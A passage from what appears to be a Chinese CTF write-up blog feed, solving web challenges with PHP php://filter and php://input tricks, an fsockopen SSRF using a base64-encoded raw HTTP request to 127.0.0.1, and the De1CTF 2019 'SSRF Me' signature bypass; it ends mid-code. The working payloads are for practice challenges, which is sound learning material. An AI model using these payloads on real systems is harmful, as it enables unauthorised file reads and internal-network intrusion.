invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你败了.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>看到<code>file_get_contents</code>明显可以使用伪协议</p><p>因此传参<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code>,再进行base64解码得到</p><p><code>NSSCTF&#123;67d04802-4a49-4cf9-810e-20542dded546&#125;</code></p><h3 id="hnctf-2022-week2ez_ssrf"><a class="markdownIt-Anchor" href="#hnctf-2022-week2ez_ssrf"></a> [HNCTF 2022 WEEK2]ez_ssrf</h3><p>打开题目，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>),<span class="hljs-variable">$error</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$data</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到属于使用fsockopen的ssrf</p><p>fsockopen的后端实现方式如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对比一下可以看到上面的data其实就相当于下面的out，因此构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$out</span>=<span class="hljs-string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span>.=<span class="hljs-string">&quot;Host: 127.0.0.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br><br><br><span class="hljs-comment">#R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQoNCg==</span><br></code></pre></td></tr></table></figure><p>接着传参<code>?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQoNCg==</code></p><img src="/2023/01/04/SSRF/4.png" class=""><h3 id="de1ctf-2019ssrf-me"><a class="markdownIt-Anchor" href="#de1ctf-2019ssrf-me"></a> [De1ctf 2019]SSRF Me</h3><p>打开得到的是混乱的源码，手动整理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> imp <span class="hljs-keyword">import</span> reload<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: app.debug = <span class="hljs-literal">False</span><br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>看到有三个路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#可以get传参param</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#可以get传参param ,cookie 传参 action ,sign</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><span class="hljs-comment">#可以get传参 param</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br></code></pre></td></tr></table></figure><p>在<code>/De1ta</code>路径下，param要经过waf()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>param参数中不能含有gopher和file</p><p>接着看到Task类的Exec()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>       result = &#123;&#125;<br>       result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>       <span class="hljs-keyword">if</span> (self.checkSign()):<br>           <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>               tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>               resp = scan(self.param)<br>               <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                   result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>               <span class="hljs-keyword">else</span>:<br>                   <span class="hljs-built_in">print</span>(resp)<br>                   tmpfile.write(resp)<br>                   tmpfile.close()<br>               result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>           <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>               f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>               result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>               result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>           <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>               result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>       <span class="hljs-keyword">else</span>:<br>           result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>           result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>       <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><p>首先要通过checkSign()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>调用了getSign(),跟进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>secert_key + param + action的md5要等于传进去的sign</p><p>action 必须要含有 <code>scan和read</code></p><p>含有scan 则可以读出param文件中的内容然后写进临时文件中，因此param传参flag.txt</p><p>含有read则可以打开临时文件并将文件内容读取出来返回</p><p>在<code>/geneSign</code>路径下的geneSign()函数可以自动利用密钥产生签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>因此在/genesign路径下传参<code>?param=flag.txtread</code></p><p>得到签名<code>3cc2121e7470ced190ff9c4d8be57d1b</code></p><p>,这样一来得到secert_keyflag.txtreadscan的md5,</p><p>回到/De1ta路径下，Task类中，</p><p>action传参readscan</p><img src="/2023/01/04/SSRF/5.png" class=""><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><em><a href="https://ctf-wiki.org/web/ssrf/?h=ssrf">https://ctf-wiki.org/web/ssrf/?h=ssrf</a></em></p><p><a href="https://tttang.com/archive/1648/#toc_dict">https://tttang.com/archive/1648/#toc_dict</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTFwp</title>
    <link href="/2023/01/04/NSSCTFwp/"/>
    <url>/2023/01/04/NSSCTFwp/</url>
    
    <content type="html"><![CDATA[<h3 id="swpuctf-2021-新生赛pseudoprotocols"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pseudoprotocols"></a> [SWPUCTF 2021 新生赛]PseudoProtocols</h3><p>有关PHP伪协议简单记一下</p><p>上来给了一个提示</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span> <span class="hljs-keyword">is</span> hear Can you find out the <span class="hljs-keyword">hint</span>.php?<br></code></pre></td></tr></table></figure><p>再看地址栏有参数wllm</p><p>直接想到伪协议读文件</p><p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//go to /test2222222222222.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问/test2222222222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计，直接php://input  再post 一个I want flag 搞定</p><img src="/2023/01/04/NSSCTFwp/1.png" class=""><h3 id="hubuctf-2022-新生赛checkin"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛checkin"></a> [HUBUCTF 2022 新生赛]checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$username</span>  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br><span class="hljs-variable">$password</span>  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br><span class="hljs-keyword">include</span>(<span 